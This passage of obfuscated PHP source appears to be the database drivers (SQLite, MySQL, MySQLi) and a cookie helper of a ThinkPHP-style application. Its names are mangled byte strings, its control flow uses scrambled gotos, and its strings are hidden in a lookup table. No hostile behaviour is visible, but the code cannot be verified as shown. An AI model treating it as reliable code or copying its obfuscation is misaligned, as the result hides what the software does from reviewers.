array(); foreach ($fÿÇê¥Èë± as $Aì…Éøπ≤∞ => $cÌ°Ûå“ƒ†) { $a˜à´ôøﬂÿ[$Aì…Éøπ≤∞] = current($cÌ°Ûå“ƒ†); } return $a˜à´ôøﬂÿ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $F•ò”Ãä•¡ =& $_SERVER[—Ω]; $d‰È‰‚ä’Ñ = sqlite_last_error($this->_linkID); $this->error = $d‰È‰‚ä’Ñ . $F•ò”Ãä•¡[4] . sqlite_error_string($d‰È‰‚ä’Ñ); if ($F•ò”Ãä•¡[33] != $this->queryStr) { $this->error .= LNG($F•ò”Ãä•¡[45]) . $this->queryStr; } think_trace($this->error, $F•ò”Ãä•¡[33], $F•ò”Ãä•¡[46]); return $this->error; } public function escapeString($a©´≤âäÏ‘) { return sqlite_escape_string($a©´≤âäÏ‘); } public function parseLimit($e”ùÆ›£ÿ») { $c™¿√øÈﬂ– =& $_SERVER[—Ω]; $cÔ©†û¨∆È = $c™¿√øÈﬂ–[33]; if (!empty($e”ùÆ›£ÿ»)) { $e”ùÆ›£ÿ» = explode($c™¿√øÈﬂ–[47], $e”ùÆ›£ÿ»); if (count($e”ùÆ›£ÿ») > 1) { $cÔ©†û¨∆È .= $c™¿√øÈﬂ–[48] . $e”ùÆ›£ÿ»[1] . $c™¿√øÈﬂ–[49] . $e”ùÆ›£ÿ»[0] . $c™¿√øÈﬂ–[50]; } else { $cÔ©†û¨∆È .= $c™¿√øÈﬂ–[48] . $e”ùÆ›£ÿ»[0] . $c™¿√øÈﬂ–[50]; } } return $cÔ©†û¨∆È; } } class DbSqlite3Base extends Db { public function __construct($DÀ•Òä∫Ôè = '') { $bøõÁ£¢»ﬁ =& $_SERVER[—Ω]; if (!class_exists($bøõÁ£¢»ﬁ[51])) { think_exception(think_lang($bøõÁ£¢»ﬁ[10]) . $bøõÁ£¢»ﬁ[52]); } if (!empty($DÀ•Òä∫Ôè)) { if (!isset($DÀ•Òä∫Ôè[$bøõÁ£¢»ﬁ[12]])) { $DÀ•Òä∫Ôè[$bøõÁ£¢»ﬁ[12]] = 438; } $this->config = $DÀ•Òä∫Ôè; if (empty($this->config[$bøõÁ£¢»ﬁ[13]])) { $this->config[$bøõÁ£¢»ﬁ[13]] = array(); } } } public function connect($f≥ëÓÀ◊§ù = '', $bõÕÚôü—ﬁ = 0) { $Fó∂Ωº’≤Ω =& $_SERVER[—Ω]; if (!isset($this->linkID[$bõÕÚôü—ﬁ])) { if (empty($f≥ëÓÀ◊§ù)) { $f≥ëÓÀ◊§ù = $this->config; } $this->linkID[$bõÕÚôü—ﬁ] = new SQLite3($f≥ëÓÀ◊§ù[$Fó∂Ωº’≤Ω[17]]); if (!$this->linkID[$bõÕÚôü—ﬁ]) { think_exception($this->linkID[$bõÕÚôü—ﬁ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$bõÕÚôü—ﬁ]->busyTimeout(30000); if (1 != think_config($Fó∂Ωº’≤Ω[18])) { unset($this->config); } } return $this->linkID[$bõÕÚôü—ﬁ]; } public function free() { $this->queryID = null; } public function query($cÓª ∫êôå) { goto c¶ﬁ¡ÇÀÎ®; bïΩñÑ·üì: $this->queryStr = $cÓª ∫êôå; if ($this->queryID) { $this->free(); } think_action_status($Bø¨ÀçÌ˘∂[19], 1); goto D≤éáΩ≤∑»; D≤éáΩ≤∑»: think_status($Bø¨ÀçÌ˘∂[20]); $this->queryID = $this->_linkID->query($cÓª ∫êôå); $this->debug(); goto Eò∞‹¥ùüå; c¶ﬁ¡ÇÀÎ®: $Bø¨ÀçÌ˘∂ =& $_SERVER[—Ω]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto bïΩñÑ·üì; Eò∞‹¥ùüå: if (!1 === $this->queryID) { $this->error(); return !1; } else { $b•’ÙÛŒéê = $this->getAll(); $this->numRows = count($b•’ÙÛŒéê); return $b•’ÙÛŒéê; } goto CπÔÃ⁄ö∫Ø; CπÔÃ⁄ö∫Ø: } public function execute($fÁì∑’ÌŸÌ) { goto cà‡ãéÛò≥; D‰≈ê•‡âÙ: think_status($E√Òà¨ﬁŒ[20]); $e±¶òõÇÙ‡ = $this->_linkID->exec($fÁì∑’ÌŸÌ); $this->debug(); goto CéÓ÷¶Ô√ı; cà‡ãéÛò≥: $E√Òà¨ﬁŒ =& $_SERVER[—Ω]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto fÀãÕäØî¶; fÀãÕäØî¶: $this->queryStr = $fÁì∑’ÌŸÌ; if ($this->queryID) { $this->free(); } think_action_status($E√Òà¨ﬁŒ[21], 1); goto D‰≈ê•‡âÙ; CéÓ÷¶Ô√ı: if (!1 === $e±¶òõÇÙ‡) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto bı’ÌøÕˆ; bı’ÌøÕˆ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[—Ω][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bÁ∑‚ç≈œ§ = $this->_linkID->query($_SERVER[—Ω][23]); if (!$bÁ∑‚ç≈œ§) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $C–ùû∞≠‚Ö = $this->_linkID->query($_SERVER[—Ω][24]); if (!$C–ùû∞≠‚Ö) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $fó°·„ì∑ = array(); while ($B÷Ìÿ…’⁄Ë = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $fó°·„ì∑[] = $B÷Ìÿ…’⁄Ë; } $this->queryID->reset(); return $fó°·„ì∑; } public function getFields($Eø„”Æ™Á≠) { $f≥¬ﬁ‰ÿ±Ö =& $_SERVER[—Ω]; $dà¶‰ØÃ⁄Ÿ = $this->query($f≥¬ﬁ‰ÿ±Ö[25] . $Eø„”Æ™Á≠ . $f≥¬ﬁ‰ÿ±Ö[26]); $C∂åëç∑–’ = array(); if ($dà¶‰ØÃ⁄Ÿ) { foreach ($dà¶‰ØÃ⁄Ÿ as $fóŒò…£ìë => $bÜÌÿ∆ÂÈÖ) { $C∂åëç∑–’[$bÜÌÿ∆ÂÈÖ[$f≥¬ﬁ‰ÿ±Ö[28]]] = array($f≥¬ﬁ‰ÿ±Ö[28] => $bÜÌÿ∆ÂÈÖ[$f≥¬ﬁ‰ÿ±Ö[28]], $f≥¬ﬁ‰ÿ±Ö[29] => $bÜÌÿ∆ÂÈÖ[$f≥¬ﬁ‰ÿ±Ö[29]], $f≥¬ﬁ‰ÿ±Ö[31] => (bool) ($bÜÌÿ∆ÂÈÖ[$f≥¬ﬁ‰ÿ±Ö[31]] === $f≥¬ﬁ‰ÿ±Ö[33]), $f≥¬ﬁ‰ÿ±Ö[34] => $bÜÌÿ∆ÂÈÖ[$f≥¬ﬁ‰ÿ±Ö[53]], $f≥¬ﬁ‰ÿ±Ö[36] => (bool) $bÜÌÿ∆ÂÈÖ[$f≥¬ﬁ‰ÿ±Ö[54]], $f≥¬ﬁ‰ÿ±Ö[39] => (bool) $bÜÌÿ∆ÂÈÖ[$f≥¬ﬁ‰ÿ±Ö[54]]); } } return $C∂åëç∑–’; } public function getTables($AÚàöõßΩ¬ = '') { $Få√≠©´’û =& $_SERVER[—Ω]; $Eå’ìÏÓÁà = $this->query($Få√≠©´’û[42] . $Få√≠©´’û[43] . $Få√≠©´’û[44]); $A∂¬öÔæãÛ = array(); foreach ($Eå’ìÏÓÁà as $c§µ—ø√…ü => $fË‡ ≥Ø≥ó) { $A∂¬öÔæãÛ[$c§µ—ø√…ü] = current($fË‡ ≥Ø≥ó); } return $A∂¬öÔæãÛ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $F†¿±›É€Ü =& $_SERVER[—Ω]; $this->error = $this->_linkID->lastErrorMsg(); if ($F†¿±›É€Ü[33] != $this->queryStr) { $this->error .= LNG($F†¿±›É€Ü[45]) . $this->queryStr; } think_trace($this->error, $F†¿±›É€Ü[33], $F†¿±›É€Ü[46]); return $this->error; } public function escapeString($Däó·ñˆòﬂ) { $c Éèìÿ« =& $_SERVER[—Ω]; if ($this->_linkID) { return $this->_linkID->escapeString($Däó·ñˆòﬂ); } return str_ireplace($c Éèìÿ«[55], $c Éèìÿ«[56], $Däó·ñˆòﬂ); } public function parseLimit($CöëÚΩÇ«õ) { $DπòœÇΩ•“ =& $_SERVER[—Ω]; $aì∫Õ´Ù™∞ = $DπòœÇΩ•“[33]; if (!empty($CöëÚΩÇ«õ)) { $CöëÚΩÇ«õ = explode($DπòœÇΩ•“[47], $CöëÚΩÇ«õ); if (count($CöëÚΩÇ«õ) > 1) { $aì∫Õ´Ù™∞ .= $DπòœÇΩ•“[48] . $CöëÚΩÇ«õ[1] . $DπòœÇΩ•“[49] . $CöëÚΩÇ«õ[0] . $DπòœÇΩ•“[50]; } else { $aì∫Õ´Ù™∞ .= $DπòœÇΩ•“[48] . $CöëÚΩÇ«õ[0] . $DπòœÇΩ•“[50]; } } return $aì∫Õ´Ù™∞; } } goto bñ§ßŸ¡é∫; aÒ†πà÷‰: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($D∆õ¯—©íˆ = '', $eÓ˜ªã»ùå = 0) { if (is_string($D∆õ¯—©íˆ) && $D∆õ¯—©íˆ != $_SERVER[—Ω][33]) { $this->prefix = $D∆õ¯—©íˆ; } if (is_numeric($eÓ˜ªã»ùå) && $eÓ˜ªã»ùå > 0) { $this->expire = $eÓ˜ªã»ùå; } } public static function getInstance() { static $fπáµæê•; if ($fπáµæê• === null) { $fπáµæê• = new self(); } return $fπáµæê•; } private static $sameCookieSet = array(); public static function set($FéÂÉﬁ÷áÜ, $AÜµ´â£Úã, $A¥÷Æ–Èﬂ• = 0, $e£∞”Ë‘ªä = false, $c‹º®óæ—± = false) { $f¢Ñª¢õ”ô =& $_SERVER[—Ω]; if (!$A¥÷Æ–Èﬂ•) { $A¥÷Æ–Èﬂ• = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$FéÂÉﬁ÷áÜ]) && self::$sameCookieSet[$FéÂÉﬁ÷áÜ] == $AÜµ´â£Úã . $A¥÷Æ–Èﬂ•) { return; } self::$sameCookieSet[$FéÂÉﬁ÷áÜ] = $AÜµ´â£Úã . $A¥÷Æ–Èﬂ•; if (!$c‹º®óæ—±) { $c‹º®óæ—± = str_replace(HOST, $f¢Ñª¢õ”ô[33], APP_HOST); $c‹º®óæ—± = _get($GLOBALS, $f¢Ñª¢õ”ô[802], $c‹º®óæ—±); } setcookie($FéÂÉﬁ÷áÜ, $AÜµ´â£Úã, time() + $A¥÷Æ–Èﬂ•, $f¢Ñª¢õ”ô[8] . trim($c‹º®óæ—±, $f¢Ñª¢õ”ô[8]), !1, !1, $e£∞”Ë‘ªä); } public static function setSafe($Dá°Ñ·¢ÃÀ, $dòìËÎäÎ, $c¢Ô©∞•ŒÎ = 0) { self::set($Dá°Ñ·¢ÃÀ, $dòìËÎäÎ, $c¢Ô©∞•ŒÎ, !0); } public static function get($F©ËŸùœŸ›) { return isset($_COOKIE[$F©ËŸùœŸ›]) ? $_COOKIE[$F©ËŸùœŸ›] : !1; } public static function remove($bè∫ç•¬Òù, $BÁöÂÒ‹¶ç = false) { unset($_COOKIE[$bè∫ç•¬Òù]); self::set($bè∫ç•¬Òù, $_SERVER[—Ω][33], 1, $BÁöÂÒ‹¶ç); } } class DbMysql extends Db { public function __construct($e¿îÉÏ¬•€ = '') { $câæóÍöÆ  =& $_SERVER[—Ω]; if (!extension_loaded($câæóÍöÆ [738])) { think_exception(think_lang($câæóÍöÆ [10]) . $câæóÍöÆ [803]); } if (!empty($e¿îÉÏ¬•€)) { $this->config = $e¿îÉÏ¬•€; if (empty($this->config[$câæóÍöÆ [13]])) { $this->config[$câæóÍöÆ [13]] = $câæóÍöÆ [33]; } } } public function connect($bÑ⁄‹ıí¶» = '', $eÎÚÌñ†ºõ = 0, $B–Ó™‡¥ëø = false) { $EËƒÕ°≤‰ª =& $_SERVER[—Ω]; if (!isset($this->linkID[$eÎÚÌñ†ºõ])) { goto fé€¨ÛËàÑ; aÌ¯ÚÈàŒø: if (1 != think_config($EËƒÕ°≤‰ª[18])) { unset($this->config); } goto f„“·„õ€‰; fé€¨ÛËàÑ: if (empty($bÑ⁄‹ıí¶»)) { $bÑ⁄‹ıí¶» = $this->config; } $E¥åÏ°£¶Ê = $bÑ⁄‹ıí¶»[$EËƒÕ°≤‰ª[804]] . ($bÑ⁄‹ıí¶»[$EËƒÕ°≤‰ª[805]] ? "\72{$bÑ⁄‹ıí¶»[$EËƒÕ°≤‰ª[805]]}" : $EËƒÕ°≤‰ª[33]); $Eó∞ä¥πÍ∂ = !empty($bÑ⁄‹ıí¶»[$EËƒÕ°≤‰ª[13]][$EËƒÕ°≤‰ª[14]]) ? $bÑ⁄‹ıí¶»[$EËƒÕ°≤‰ª[13]][$EËƒÕ°≤‰ª[14]] : $this->pconnect; goto FÁ‹Ω“Œá„; Dˆ†∑ù›ÀÇ: mysql_query($EËƒÕ°≤‰ª[808] . think_config($EËƒÕ°≤‰ª[809]) . $EËƒÕ°≤‰ª[55], $this->linkID[$eÎÚÌñ†ºõ]); if ($côóé•Çûœ > $EËƒÕ°≤‰ª[810]) { mysql_query($EËƒÕ°≤‰ª[811], $this->linkID[$eÎÚÌñ†ºõ]); } $this->connected = !0; goto aÌ¯ÚÈàŒø; FÁ‹Ω“Œá„: if ($Eó∞ä¥πÍ∂) { $this->linkID[$eÎÚÌñ†ºõ] = mysql_pconnect($E¥åÏ°£¶Ê, $bÑ⁄‹ıí¶»[$EËƒÕ°≤‰ª[806]], $bÑ⁄‹ıí¶»[$EËƒÕ°≤‰ª[807]], 131072); } else { $this->linkID[$eÎÚÌñ†ºõ] = mysql_connect($E¥åÏ°£¶Ê, $bÑ⁄‹ıí¶»[$EËƒÕ°≤‰ª[806]], $bÑ⁄‹ıí¶»[$EËƒÕ°≤‰ª[807]], !0, 131072); } if (!$this->linkID[$eÎÚÌñ†ºõ] || !empty($bÑ⁄‹ıí¶»[$EËƒÕ°≤‰ª[17]]) && !mysql_select_db($bÑ⁄‹ıí¶»[$EËƒÕ°≤‰ª[17]], $this->linkID[$eÎÚÌñ†ºõ])) { think_exception(mysql_error()); } $côóé•Çûœ = mysql_get_server_info($this->linkID[$eÎÚÌñ†ºõ]); goto Dˆ†∑ù›ÀÇ; f„“·„õ€‰: } return $this->linkID[$eÎÚÌñ†ºõ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($CÀ∫ÇÀÕ◊) { goto f—ãÕ™Ï´°; Eà‡”≈È∞ó: if (!$this->_linkID) { return !1; } $this->queryStr = $CÀ∫ÇÀÕ◊; if ($this->queryID) { $this->free(); } goto b¯ç”èßÏ; b¯ç”èßÏ: think_action_status($Eãö  ‡÷ì[19], 1); think_status($Eãö  ‡÷ì[20]); $this->queryID = mysql_query($CÀ∫ÇÀÕ◊, $this->_linkID); goto B¯ˆ•º≈äØ; f—ãÕ™Ï´°: $Eãö  ‡÷ì =& $_SERVER[—Ω]; if (0 === stripos($CÀ∫ÇÀÕ◊, $Eãö  ‡÷ì[249])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto Eà‡”≈È∞ó; B¯ˆ•º≈äØ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto Dúòá∫ÊçË; Dúòá∫ÊçË: } public function execute($b˜Æ£¡⁄ªµ) { goto bﬁ†ﬁÔ¥»Œ; bﬁ†ﬁÔ¥»Œ: $DÒë∞®Ë®Æ =& $_SERVER[—Ω]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BÒ∏¬û’ÆÖ; D¡Çúé‡è˜: think_status($DÒë∞®Ë®Æ[20]); $Bäô¨âÖ‹ò = mysql_query($b˜Æ£¡⁄ªµ, $this->_linkID); $this->debug(); goto CÊ∂ƒé£Ω¯; BÒ∏¬û’ÆÖ: $this->queryStr = $b˜Æ£¡⁄ªµ; if ($this->queryID) { $this->free(); } think_action_status($DÒë∞®Ë®Æ[21], 1); goto D¡Çúé‡è˜; CÊ∂ƒé£Ω¯: if (!1 === $Bäô¨âÖ‹ò) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto d∆ÌÛ”πíŸ; d∆ÌÛ”πíŸ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[—Ω][812], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B€†Ñ⁄Ê∏¡ = mysql_query($_SERVER[—Ω][813], $this->_linkID); $this->transTimes = 0; if (!$B€†Ñ⁄Ê∏¡) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $d⁄Öô§îç› = mysql_query($_SERVER[—Ω][814], $this->_linkID); $this->transTimes = 0; if (!$d⁄Öô§îç›) { $this->error(); return !1; } } return !0; } private function getAll() { $e“ûΩÓ¶ˆ◊ = array(); if ($this->numRows > 0) { while ($d ó›Õ¶¢Ú = mysql_fetch_assoc($this->queryID)) { $e“ûΩÓ¶ˆ◊[] = $d ó›Õ¶¢Ú; } mysql_data_seek($this->queryID, 0); } return $e“ûΩÓ¶ˆ◊; } public function getFields($e™üÈæáèÓ) { $bÃÃôœ’Ø… =& $_SERVER[—Ω]; $F≠ΩÍ¿ããí = $this->query($bÃÃôœ’Ø…[815] . $this->parseKey($e™üÈæáèÓ)); $dÉÜÆàøÜ˜ = array(); if ($F≠ΩÍ¿ããí) { foreach ($F≠ΩÍ¿ããí as $E‹Èèç∫≠ê => $bÇ«›äˆàÃ) { $dÉÜÆàøÜ˜[$bÇ«›äˆàÃ[$bÃÃôœ’Ø…[27]]] = array($bÃÃôœ’Ø…[28] => $bÇ«›äˆàÃ[$bÃÃôœ’Ø…[27]], $bÃÃôœ’Ø…[29] => $bÇ«›äˆàÃ[$bÃÃôœ’Ø…[30]], $bÃÃôœ’Ø…[31] => (bool) (strtoupper($bÇ«›äˆàÃ[$bÃÃôœ’Ø…[32]]) === $bÃÃôœ’Ø…[816]), $bÃÃôœ’Ø…[34] => $bÇ«›äˆàÃ[$bÃÃôœ’Ø…[35]], $bÃÃôœ’Ø…[36] => strtolower($bÇ«›äˆàÃ[$bÃÃôœ’Ø…[37]]) == $bÃÃôœ’Ø…[38], $bÃÃôœ’Ø…[39] => strtolower($bÇ«›äˆàÃ[$bÃÃôœ’Ø…[40]]) == $bÃÃôœ’Ø…[41]); } } return $dÉÜÆàøÜ˜; } public function getTables($Fàï∆ƒÏíÙ = '') { $fñ∞ΩÒ¨ÃŒ =& $_SERVER[—Ω]; if (!empty($Fàï∆ƒÏíÙ)) { $DÚﬂ⁄ˆ∂∫è = $fñ∞ΩÒ¨ÃŒ[817] . $Fàï∆ƒÏíÙ; } else { $DÚﬂ⁄ˆ∂∫è = $fñ∞ΩÒ¨ÃŒ[818]; } $AÇØàãÓ’√ = $this->query($DÚﬂ⁄ˆ∂∫è); $eŸõ≈òÕˆ = array(); foreach ($AÇØàãÓ’√ as $Fúã¯ôîçß => $b“ÓÍÑÏÊ ) { $eŸõ≈òÕˆ[$Fúã¯ôîçß] = current($b“ÓÍÑÏÊ ); } return $eŸõ≈òÕˆ; } public function replace($fúø•çÍ”¿, $DÉÿœÌﬁ…ú = array()) { $c“áÈÖõ—ç =& $_SERVER[—Ω]; foreach ($fúø•çÍ”¿ as $dç¬…ÈË∏ß => $bè–óßË…©) { $eã‘“ÑÓé¯ = $this->parseValue($bè–óßË…©); if (is_scalar($eã‘“ÑÓé¯)) { $e„◊”´Âë•[] = $eã‘“ÑÓé¯; $d‰à˘´ˆıÍ[] = $this->parseKey($dç¬…ÈË∏ß); } } $Dß’§ëùæ = $c“áÈÖõ—ç[819] . $this->parseTable($DÉÿœÌﬁ…ú[$c“áÈÖõ—ç[264]]) . $c“áÈÖõ—ç[820] . implode($c“áÈÖõ—ç[47], $d‰à˘´ˆıÍ) . $c“áÈÖõ—ç[821] . implode($c“áÈÖõ—ç[47], $e„◊”´Âë•) . $c“áÈÖõ—ç[822]; return $this->execute($Dß’§ëùæ); } public function insertAll($cæ¨Òƒ§ , $d±≤´¯´∫© = array(), $cË•¬äéµÚ = false) { goto eóÏû—˜Íá; dûÜ◊∑±¿: $B”îƒœ˜ë£ = ($cË•¬äéµÚ ? $C®çáÈ¢‡Ÿ[824] : $C®çáÈ¢‡Ÿ[825]) . $C®çáÈ¢‡Ÿ[826] . $this->parseTable($d±≤´¯´∫©[$C®çáÈ¢‡Ÿ[264]]) . $C®çáÈ¢‡Ÿ[820] . implode($C®çáÈ¢‡Ÿ[47], $f¯Îíù¥âÂ) . $C®çáÈ¢‡Ÿ[827] . implode($C®çáÈ¢‡Ÿ[47], $føËÎ⁄™å°); return $this->execute($B”îƒœ˜ë£); goto eÕ⁄¡„à§ü; eóÏû—˜Íá: $C®çáÈ¢‡Ÿ =& $_SERVER[—Ω]; if (!is_array($cæ¨Òƒ§ [0])) { return !1; } $f¯Îíù¥âÂ = array_keys($cæ¨Òƒ§ [0]); goto DÓ⁄ìÜ÷‰î; DÓ⁄ìÜ÷‰î: $føËÎ⁄™å° = array(); foreach ($cæ¨Òƒ§  as $d√π∫ëÕÈò) { $bœ√ÆÿŸ£Ö = array(); foreach ($d√π∫ëÕÈò as $bì ¥÷¬’¥ => $FÂèô¶†Ì‹) { $FÂèô¶†Ì‹ = $this->parseValue($FÂèô¶†Ì‹); if (is_scalar($FÂèô¶†Ì‹)) { $bœ√ÆÿŸ£Ö[] = $FÂèô¶†Ì‹; } } $føËÎ⁄™å°[] = $C®çáÈ¢‡Ÿ[245] . implode($C®çáÈ¢‡Ÿ[47], $bœ√ÆÿŸ£Ö) . $C®çáÈ¢‡Ÿ[822]; } array_walk($f¯Îíù¥âÂ, array($this, $C®çáÈ¢‡Ÿ[823])); goto dûÜ◊∑±¿; eÕ⁄¡„à§ü: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $BáΩıø⁄è· =& $_SERVER[—Ω]; $this->error = mysql_errno() . $BáΩıø⁄è·[4] . mysql_error($this->_linkID); if ($BáΩıø⁄è·[33] != $this->queryStr) { $this->error .= LNG($BáΩıø⁄è·[45]) . $this->queryStr; } think_trace($this->error, $BáΩıø⁄è·[33], $BáΩıø⁄è·[46]); return $this->error; } public function escapeString($aöÁô∏£≤Á) { if ($this->_linkID) { return mysql_real_escape_string($aöÁô∏£≤Á, $this->_linkID); } else { return mysql_escape_string($aöÁô∏£≤Á); } } public function parseKey(&$Dı¡Œ‡Óèƒ, $fÛÉ∞ãÃ˜∏ = true) { $D»≥õ°è…≤ =& $_SERVER[—Ω]; if ($fÛÉ∞ãÃ˜∏) { $Dı¡Œ‡Óèƒ = $this->parseKeyCheck($Dı¡Œ‡Óèƒ); } if ($Dı¡Œ‡Óèƒ != $D»≥õ°è…≤[173] && !preg_match($D»≥õ°è…≤[828], $Dı¡Œ‡Óèƒ)) { $Dı¡Œ‡Óèƒ = $D»≥õ°è…≤[829] . trim($Dı¡Œ‡Óèƒ, $D»≥õ°è…≤[829]) . $D»≥õ°è…≤[829]; } return $Dı¡Œ‡Óèƒ; } } class DbMysqli extends Db { public function __construct($E¥ìâÔ¯»î = '') { $aìÉâ›Ü∏¥ =& $_SERVER[—Ω]; if (!extension_loaded($aìÉâ›Ü∏¥[737])) { think_exception(think_lang($aìÉâ›Ü∏¥[10]) . $aìÉâ›Ü∏¥[830]); } if (!empty($E¥ìâÔ¯»î)) { $this->config = $E¥ìâÔ¯»î; if (empty($this->config[$aìÉâ›Ü∏¥[13]])) { $this->config[$aìÉâ›Ü∏¥[13]] = $aìÉâ›Ü∏¥[33]; } } } public function connect($f–ÿª–∑¶Á = '', $BéÁ¢œ œ¥ = 0) { $C•›•í∏ë¬ =& $_SERVER[—Ω]; if (!isset($this->linkID[$BéÁ¢œ œ¥])) { goto a€éüÇÇœç; a€éüÇÇœç: if (empty($f–ÿª–∑¶Á)) { $f–ÿª–∑¶Á = $this->config; } $this->linkID[$BéÁ¢œ œ¥] = new mysqli($f–ÿª–∑¶Á[$C•›•í∏ë¬[804]], $f–ÿª–∑¶Á[$C•›•í∏ë¬[806]], $f–ÿª–∑¶Á[$C•›•í∏ë¬[807]], $f–ÿª–∑¶Á[$C•›•í∏ë¬[17]], $f–ÿª–∑¶Á[$C•›•í∏ë¬[805]] ? intval($f–ÿª–∑¶Á[$C•›•í∏ë¬[805]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto fΩ∞Ö‘äâ‚; fΩ∞Ö‘äâ‚: $BœõáÑ˘≈Ω = $this->linkID[$BéÁ¢œ œ¥]->server_version; $this->linkID[$BéÁ¢œ œ¥]->query($C•›•í∏ë¬[808] . think_config($C•›•í∏ë¬[809]) . $C•›•í∏ë¬[55]); if ($BœõáÑ˘≈Ω > $C•›•í∏ë¬[810]) { $this->linkID[$BéÁ¢œ œ¥]->query($C•›•í∏ë¬[811]); } goto EÌ¡⁄π¢£·; EÌ¡⁄π¢£·: $this->connected = !0; if (1 != think_config($C•›•í∏ë¬[18])) { unset($this->config); } goto däÎÚ»ù∏Ü; däÎÚ»ù∏Ü: } return $this->linkID[$BéÁ¢œ œ¥]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($F—•ìπ±™ê) { goto E¢•â≠üúÁ; dùï‘™ﬁûƒ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto D›œø∑ Ã; E¢•â≠üúÁ: $Eÿ≈´âù‚º =& $_SERVER[—Ω]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto déê«¶É™‡; bì—¢ÿßùç: think_status($Eÿ≈´âù‚º[20]); $this->queryID = $this->_linkID->query($F—•ìπ±™ê); if ($this->_linkID->more_results()) { while (($D„ãæ≈”ûç = $this->_linkID->next_result()) != NULL) { $D„ãæ≈”ûç->free_result(); } } goto dùï‘™ﬁûƒ; déê«¶É™‡: $this->queryStr = $F—•ìπ±™ê; if ($this->queryID) { $this->free(); } think_action_status($Eÿ≈´âù‚º[19], 1); goto bì—¢ÿßùç; D›œø∑ Ã: } public function execute($eœ«Ü«ê’‡) { goto aÈœß‹Ü¨ƒ; C‡öéç©Ω◊: think_status($cÓµøÑı“Ü[20]); $FÑÚﬂã‹âÊ = $this->_linkID->query($eœ«Ü«ê’‡); $this->debug(); goto Dë≈ç≈å‚æ; aÈœß‹Ü¨ƒ: $cÓµøÑı“Ü =& $_SERVER[—Ω]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto dñë∞á›¢›; Dë≈ç≈å‚æ: if (!1 === $FÑÚﬂã‹âÊ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto aë§¢∞™Æ©; dñë∞á›¢›: $this->queryStr = $eœ«Ü«ê’‡; if ($this->queryID) { $this->free(); } think_action_status($cÓµøÑı“Ü[21], 1); goto C‡öéç©Ω◊; aë§¢∞™Æ©: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fôÏ®Èﬁ°ﬂ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$fôÏ®Èﬁ°ﬂ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Aö•Õ®˜ëπ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Aö•Õ®˜ëπ) { $this->error(); return !1; } } return !0; } private function getAll() { $CêªÚÉ’‚° = array(); if ($this->numRows > 0) { for ($D» ∞È‹âå = 0; $D» ∞È‹âå < $this->numRows; $D» ∞È‹âå++) { $CêªÚÉ’‚°[$D» ∞È‹âå] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $CêªÚÉ’‚°; } public function getFields($Bÿ´Îã¶‚Æ) { $bºëˆ∑±Á¯ =& $_SERVER[—Ω]; $fÙÒ∫èÔ¨ﬁ = $this->query($bºëˆ∑±Á¯[815] . $this->parseKey($Bÿ´Îã¶‚Æ)); $cÉØöÓÈûë = array(); if ($fÙÒ∫èÔ¨ﬁ) { foreach ($fÙÒ∫èÔ¨ﬁ as $FåÑÑèÀçÃ => $Cñıøäò‡∑) { $cÉØöÓÈûë[$Cñıøäò‡∑[$bºëˆ∑±Á¯[27]]] = array($bºëˆ∑±Á¯[28] => $Cñıøäò‡∑[$bºëˆ∑±Á¯[27]], $bºëˆ∑±Á¯[29] => $Cñıøäò‡∑[$bºëˆ∑±Á¯[30]], $bºëˆ∑±Á¯[31] => (bool) ($Cñıøäò‡∑[$bºëˆ∑±Á¯[32]] === $bºëˆ∑±Á¯[33]), $bºëˆ∑±Á¯[34] => $Cñıøäò‡∑[$bºëˆ∑±Á¯[35]], $bºëˆ∑±Á¯[36] => strtolower($Cñıøäò‡∑[$bºëˆ∑±Á¯[37]]) == $bºëˆ∑±Á¯[38], $bºëˆ∑±Á¯[39] => strtolower($Cñıøäò‡∑[$bºëˆ∑±Á¯[40]]) == $bºëˆ∑±Á¯[41]); } } return $cÉØöÓÈûë; } public function 